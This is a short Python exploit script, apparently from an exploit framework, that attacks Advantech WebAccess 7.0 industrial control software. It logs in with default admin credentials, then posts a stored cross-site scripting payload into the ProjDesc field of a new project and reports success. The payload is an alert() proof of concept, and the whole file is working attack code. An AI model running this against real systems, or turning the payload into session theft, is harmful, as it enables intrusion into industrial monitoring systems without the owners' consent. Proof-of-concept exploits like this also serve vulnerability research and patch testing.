import requests
from utils.logger import setup_logger

logger = setup_logger()

def exploit(target: str, port: int = 80, user: str = "admin", pwd: str = "admin"):
    """
    Advantech WebAccess 7.0 â€“ Persistent Stored XSS via ProjDesc
    Requires login to bwconfig.asp
    Discovered by: Antu Sanadi (SecPod)
    """

    base_url = f"http://{target}:{port}/broadWeb"
    login_url = f"{base_url}/bwconfig.asp"
    xss_url = f"{base_url}/include/gAddNew.asp"

    session = requests.Session()

    try:
        logger.info(f"[*] Attempting login as {user}")

        # Step 1: Login (authentication is weak, mostly user-based)
        login_params = {"user": user}
        r = session.get(login_url, params=login_params, timeout=5)

        if "project" not in r.text.lower():
            logger.warning("[!] Login failed or interface not detected")
            return False
        logger.info("[+] Logged in successfully")

        # Step 2: Inject persistent XSS via project creation
        payload = {
            "tableName": "pProject",
            "ProjDesc": '<script>alert("XSS")</script>',
            "ProjName": "xss_test",
            "nodeName": "127.0.0.1",
            "port": "8080",
            "update": "Add"
        }

        logger.info(f"[*] Sending XSS payload to {xss_url}")
        xss = session.post(xss_url, data=payload, timeout=5)

        if xss.status_code == 200:
            logger.info("[+] Persistent XSS injected successfully!")
            logger.info(f"[+] Visit: http://{target}:{port}/broadweb/bwproj.asp to trigger the alert")
            return True
        else:
            logger.warning(f"[!] Unexpected response code: {xss.status_code}")
    except Exception as e:
        logger.error(f"[!] Exploit failed: {e}")
    return False
